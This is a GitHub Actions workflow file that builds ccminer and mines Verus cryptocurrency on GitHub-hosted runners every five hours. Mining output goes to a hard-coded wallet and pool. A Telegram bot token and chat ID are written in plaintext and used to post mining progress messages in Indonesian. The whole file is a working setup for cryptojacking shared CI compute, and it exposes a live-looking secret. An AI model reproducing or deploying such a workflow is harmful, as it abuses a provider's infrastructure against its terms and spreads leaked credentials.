name: A1

on:
  schedule:
    - cron: "0 */5 * * *"
  workflow_dispatch:

jobs:
  verusmine:
    runs-on: ubuntu-latest
    timeout-minutes: 300

    steps:
    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install -y git build-essential cmake curl

    - name: Clone ccminer
      run: |
        git clone https://github.com/veruscoin/ccminer.git ccminer

    - name: Build ccminer
      run: |
        cd ccminer
        mkdir build && cd build
        cmake ..
        make -j$(nproc)

    - name: Start mining Verus (hybrid mode, no idle watchdog)
      run: |
        cd ccminer/build

        WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
        POOL="stratum+tcp://ap.luckpool.net:3956#xnsub"
        PASSWORD="hybrid"
        THREADS=2
        WORKER="A1"
        LOG_FILE="log.txt"

        TELEGRAM_TOKEN="7548058927:AAF-fL3P6W5sNxbzbmwwtsfVxPZubdIybzc"
        TELEGRAM_CHAT_ID="5763229296"

        send_telegram() {
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
            -d chat_id=${TELEGRAM_CHAT_ID} \
            -d parse_mode=Markdown \
            -d text="$1"
        }

        send_telegram "‚õèÔ∏è *Mining dimulai* di *$WORKER* (hybrid), *$THREADS* thread."

        ./ccminer -a verus -o $POOL -u $WALLET.$WORKER -p $PASSWORD -t $THREADS | tee "$LOG_FILE" &
        MINER_PID=$!

        tail -F "$LOG_FILE" | while read LINE; do
          if echo "$LINE" | grep -q "accepted"; then
            TOTAL=$(grep -c "accepted" "$LOG_FILE")
            send_telegram "üéâ *Share accepted* ke‚Äë$TOTAL di *$WORKER*"
          fi
        done & TAIL_PID=$!

        wait $MINER_PID
        kill $TAIL_PID

        TOTAL_FINAL=$(grep -c "accepted" "$LOG_FILE")
        send_telegram "‚úÖ *Mining selesai* di *$WORKER*. Total accepted: *$TOTAL_FINAL*"
